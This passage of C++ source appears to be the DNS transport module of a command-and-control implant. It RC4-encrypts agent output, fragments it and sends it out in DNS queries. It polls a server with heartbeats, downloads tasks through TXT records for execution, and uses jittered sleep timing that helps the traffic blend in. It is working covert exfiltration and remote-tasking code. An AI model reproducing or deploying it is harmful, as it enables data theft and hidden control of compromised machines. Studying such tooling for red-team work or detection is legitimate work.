            payload = compBuf;
            payloadLen = compLen;
        }

        BYTE* encBuf = (BYTE*)MemAllocLocal(payloadLen);
        if (encBuf) {
            memcpy(encBuf, payload, payloadLen);
            EncryptRC4(encBuf, payloadLen, this->encryptKey, 16);

            if (SendQuery("www", encBuf, payloadLen))
                this->hiSent = TRUE;

            MemFreeLocal((LPVOID*)&encBuf, payloadLen);
        }

        if (compBuf)
            MemFreeLocal((LPVOID*)&compBuf, compLen);
        return;
    }

    // 2: Send data (upload)
    // Protocol (matches listener_dns_v2):
    //   1) RC4(sessionKey) entire agent output
    //   2) fragment as [total:4 BE][offset:4 BE][chunk...]
    //   3) RC4(encryptKey) each full frame independently
    if (plainData && plainSize > 0 && sessionKey) {
        EncryptRC4(plainData, plainSize, sessionKey, 16);

        ULONG total = plainSize;
        ULONG offset = 0;
        ULONG maxChunk = this->pktSize > 8 ? this->pktSize - 8 : 92;

        while (offset < total) {
            ULONG chunk = total - offset;
            if (chunk > maxChunk)
                chunk = maxChunk;

            ULONG frameSize = 8 + chunk;
            BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
            if (!frame)
                break;

            WriteBE32(frame, total);
            WriteBE32(frame + 4, offset);
            memcpy(frame + 8, plainData + offset, chunk);
            EncryptRC4(frame, frameSize, this->encryptKey, 16);

            BOOL sent = SendQuery("cdn", frame, frameSize);
            MemFreeLocal((LPVOID*)&frame, frameSize);

            if (!sent)
                break;

            offset += chunk;
        }
        if (offset > 0)
            this->lastUpTotal = offset;
    }

    // 3: Heartbeat (A record: flags in first byte)
    // Payload: [ackOffset:4 BE][ackNonce:4 BE] under encryptKey
    {
        BYTE ackBuf[8];
        ULONG ackOff = this->downFilled;
        ULONG ackNonce = this->downTaskNonce;
        if (ackOff == 0 && this->pendingDownAck > 0) {
            ackOff = this->pendingDownAck;
            ackNonce = this->pendingDownNonce;
        }
        WriteBE32(ackBuf, ackOff);
        WriteBE32(ackBuf + 4, ackNonce);
        EncryptRC4(ackBuf, 8, this->encryptKey, 16);

        BYTE resp[512];
        ULONG respSize = 0;
        if (SendQueryWithResp("hb", ackBuf, 8, resp, sizeof(resp), &respSize)) {
            if (respSize >= 4) {
                BYTE flags = resp[0];
                this->hasPendingTasks = (flags & 0x01) ? TRUE : FALSE;
            }
            if (this->pendingDownAck > 0 && ackOff == this->pendingDownAck) {
                this->pendingDownAck = 0;
                this->pendingDownNonce = 0;
            }
        }
    }

    // 4: Download (TXT: base64(RC4(encryptKey, [total|offset|nonce|data])))
    for (int nget = 0; nget < 64; nget++) {
        if (!this->hasPendingTasks && !(this->downBuf && this->downTotal > 0 && this->downFilled < this->downTotal))
            break;

        ULONG reqOffset = this->downFilled;
        ULONG nonce = this->functions->GetTickCount() ^ (this->seq << 16);

        BYTE reqBuf[8];
        WriteBE32(reqBuf, reqOffset);
        WriteBE32(reqBuf + 4, nonce);
        EncryptRC4(reqBuf, 8, this->encryptKey, 16);

        BYTE resp[4096];
        ULONG respSize = 0;
        if (!SendQueryTXT("api", reqBuf, 8, resp, sizeof(resp), &respSize) || respSize == 0) {
            if (!this->downBuf)
                this->downFilled = 0;
            break;
        }

        BYTE binBuf[4096];
        int binLen = DnsCodec::Base64Decode((const CHAR*)resp, (int)respSize, binBuf, (int)sizeof(binBuf));
        if (binLen <= 12) {
            if (!this->downBuf)
                this->downFilled = 0;
            break;
        }

        DecryptRC4(binBuf, binLen, this->encryptKey, 16);

        ULONG total = ReadBE32(binBuf);
        ULONG offset = ReadBE32(binBuf + 4);
        this->downTaskNonce = ReadBE32(binBuf + 8);
        ULONG dataLen = (ULONG)binLen - 12;

        if (!(total > 0 && total <= 4194304 && offset + dataLen <= total))
            break;

        if (!this->downBuf || this->downTotal != total) {
            if (this->downBuf)
                MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
            this->downBuf = (BYTE*)MemAllocLocal(total);
            if (!this->downBuf) {
                this->downTotal = 0;
                return;
            }
            this->downTotal = total;
            this->downFilled = 0;
        }

        memcpy(this->downBuf + offset, binBuf + 12, dataLen);
        if (offset + dataLen > this->downFilled)
            this->downFilled = offset + dataLen;

        if (this->downFilled >= this->downTotal) {
            ULONG doneTotal = this->downTotal;
            FinalizeDownload();
            this->hasPendingTasks = TRUE;
            this->downFilled = doneTotal;
            continue;
        }
        this->hasPendingTasks = TRUE;
    }

    // Downstream payload from FrameManager is already RC4(sessionKey)-encrypted by PackTasks.
    // ProcessCommandTasks expects plaintext after session decrypt.
    if (this->recvSize > 0 && this->recvData && sessionKey) {
        DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
    }
}

void ConnectorDNS::UpdateBurstConfig(ULONG enabled, ULONG sleepMs, ULONG jitterPct)
{
    this->profile.burst_enabled = enabled;
    this->profile.burst_sleep   = sleepMs;
    this->profile.burst_jitter  = jitterPct;
}

void ConnectorDNS::GetBurstConfig(ULONG* enabled, ULONG* sleepMs, ULONG* jitterPct)
{
    if (enabled)
        *enabled = this->profile.burst_enabled;
    if (sleepMs)
        *sleepMs = this->profile.burst_sleep;
    if (jitterPct)
        *jitterPct = this->profile.burst_jitter;
}

BOOL ConnectorDNS::IsBusy() const
{
    return (this->downBuf != NULL) || this->hasPendingTasks ||
           (this->downTotal > 0 && this->downFilled < this->downTotal);
}

void ConnectorDNS::Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput, DWORD pollIntervalMs)
{
    BOOL isBusy = this->IsBusy();
    BOOL burst  = isBusy || (this->lastUpTotal >= 1024) || (this->lastDownTotal >= 1024) || hasOutput;

    if (burst && this->profile.burst_enabled) {
        ULONG burstMs = this->profile.burst_sleep;
        ULONG burstJitter = this->profile.burst_jitter;
        if (burstMs == 0)
            burstMs = 50;

        if (burstJitter > 0 && burstJitter <= 90) {
            ULONG jitterRange = (burstMs * burstJitter) / 100;
            ULONG jitterDelta = 0;
            if (this->functions && this->functions->GetTickCount)
                jitterDelta = this->functions->GetTickCount() % (jitterRange + 1);
            burstMs = burstMs - (jitterRange / 2) + jitterDelta;
            if (burstMs < 10)
                burstMs = 10;
        }
        mySleep(burstMs);
        this->ResetTrafficTotals();
    } else {
        if (pollIntervalMs > 0) {
            if (wakeupEvent) {
                DWORD r = ApiWin->WaitForSingleObject(wakeupEvent, pollIntervalMs);
                if (r == WAIT_OBJECT_0)
                    ApiWin->ResetEvent(wakeupEvent);
            } else {
                ApiWin->Sleep(pollIntervalMs);
            }
        } else {
            WaitMaskWithEvent(wakeupEvent, workingSleep, sleepDelay, jitter);
        }
        if (burst)
            this->ResetTrafficTotals();
    }
}

BYTE* ConnectorDNS::RecvData()
{
    return this->recvData;
}

int ConnectorDNS::RecvSize()
{
    return this->recvSize;
}

void ConnectorDNS::RecvClear()
{
    if (this->recvData) {
        MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
        this->recvData = NULL;
        this->recvSize = 0;
    }
}
